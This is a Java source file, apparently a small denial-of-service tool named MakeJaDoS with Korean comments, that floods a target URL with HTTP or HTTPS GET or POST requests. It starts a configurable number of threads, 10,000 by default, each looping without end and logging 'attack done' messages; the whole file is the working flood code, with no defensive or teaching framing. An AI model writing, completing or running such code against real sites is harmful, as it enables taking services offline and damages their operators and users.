import java.io.*;
import java.net.*;
import java.util.ArrayList;

import javax.net.ssl.HttpsURLConnection;


public class MakeJaDoS implements Runnable{
	 private final String USER_AGENT = "Mozilla/5.0";
	    private static int amount = 0;
	    private static String url = "";
        private int attakingAmoun = 0;
	    private int seq;
	    private int type;

	    public MakeJaDoS(int seq, int type) {
	        this.seq = seq;
	        this.type = type;
	    }
	    
	    public void run() {
	        try {
	            while (true) {
	                switch (this.type) {
	                    case 1:
	                        postAttack(MakeJaDoS.url);
	                        break;
	                    case 2:
	                        sslPostAttack(MakeJaDoS.url);
	                        break;
	                    case 3:
	                        getAttack(MakeJaDoS.url);
	                        break;
	                    case 4:
	                        sslGetAttack(MakeJaDoS.url);
	                        break;

	                }
	            }
	        } catch (Exception e) {

	        }
	    }
	    	    
	    

		//urlchecking 및 스레드 유휴
	    public int urlcheck(String option, String url) throws Exception {
	    	 
	    	 String[] SUrl = url.split("://");
	    	 int ioption = 1;
	    	 
	         if (SUrl[0] == "http" || SUrl[0].equals("http")) {
	             this.checkConnection(url);
	         } else {
	             this.sslCheckConnection(url);
	         }

	         if (option == "get" || option == "GET") {
	             if (SUrl[0] == "http" || SUrl[0].equals("http")) {
	                 ioption = 3;
	             } else {
	                 ioption = 4;
	             }
	         } else {
	             if (SUrl[0] == "http" || SUrl[0].equals("http")) {
	                 ioption = 1;
	             } else {
	                 ioption = 2;
	             }
	         }

	         Thread.sleep(2000);
	         
	         return ioption;

	    }
	    
	    //공격을 하는 부분
	    public void attack(int ioption) {
	    	ArrayList<Thread> threads = new ArrayList<Thread>();
	         for (int i = 0; i < MakeJaDoS.amount; i++) {
	             Thread t = new Thread(new MakeJaDoS(i, ioption));
	             t.start();
	             threads.add(t);
	         }

	         for (int i = 0; i < threads.size(); i++) {
	             Thread t = threads.get(i);
	             try {
	                 t.join();
	             } catch (Exception e) {

	             }
	         }
	    }
	    
	    //패킷 양 조절
	    public void packetmount(String amount) {
	    	if (amount == null || amount.equals(null) || amount.equals("")) {
	            MakeJaDoS.amount = 10000;
	        } else {
	            MakeJaDoS.amount = Integer.parseInt(amount);
	        }
	    }

	//------------------------------------check-----------------------------------------    
	    private void checkConnection(String url) throws Exception {
	        System.out.println("Checking Connection");
	        URL obj = new URL(url);
	        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
	        con.setRequestMethod("GET");
	        con.setRequestProperty("User-Agent", USER_AGENT);

	        int responseCode = con.getResponseCode();
	        if (responseCode == 200) {
	            System.out.println("Connected to website");
	        }
	        MakeJaDoS.url = url;
	    }
	    
	  
	    private void sslCheckConnection(String url) throws Exception {
	        System.out.println("Checking Connection (ssl)");
	        URL obj = new URL(url);
	        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
	        con.setRequestMethod("GET");
	        con.setRequestProperty("User-Agent", USER_AGENT);

	        int responseCode = con.getResponseCode();
	        if (responseCode == 200) {
	            System.out.println("Connected to website");
	        }
	        MakeJaDoS.url = url;
	    }

	    private void postAttack(String url) throws Exception {
	        URL obj = new URL(url);
	        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
	        con.setRequestMethod("POST");
	        con.setRequestProperty("User-Agent", USER_AGENT);
	        con.setRequestProperty("Accept-Language", "en-US,en;");
	        String urlParameters = "out of memory";

	        con.setDoOutput(true);
	        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
	        wr.writeBytes(urlParameters);
	        wr.flush();
	        wr.close();
	        int responseCode = con.getResponseCode();
	        System.out.println("POST Based attack done! Response: " + responseCode + "   --Debug -Thread: " + this.seq);
	    }

	    private void getAttack(String url) throws Exception {
	        URL obj = new URL(url);
	        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
	        con.setRequestMethod("GET");
	        con.setRequestProperty("User-Agent", USER_AGENT);

	        int responseCode = con.getResponseCode();
	        System.out.println("GET Based attack done! Response: " + responseCode + "    --Dubug -Thread: " + this.seq);
	    }

	    private void sslPostAttack(String url) throws Exception {
	        URL obj = new URL(url);
	        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
	        con.setRequestMethod("GET");
	        con.setRequestProperty("User-Agent", USER_AGENT);
	        con.setRequestProperty("Accept-Language", "en-US,en;");
	        String urlParameters = "out of memory";

	        con.setDoOutput(true);
	        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
	        wr.writeBytes(urlParameters);
	        wr.flush();
	        wr.close();
	        int responseCode = con.getResponseCode();
	        System.out.println("POST(ssl) Based attack done! Response: " + responseCode + "   --Debug -Thread: " + this.seq);
	    }

	    private void sslGetAttack(String url) throws Exception {
	        URL obj = new URL(url);
	        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
	        con.setRequestMethod("GET");
	        con.setRequestProperty("User-Agent", USER_AGENT);

	        int responseCode = con.getResponseCode();
	        System.out.println("GET(ssl) Based attack done! Response: " + responseCode + "    --Debug -Thread: " + this.seq);
	    }
}
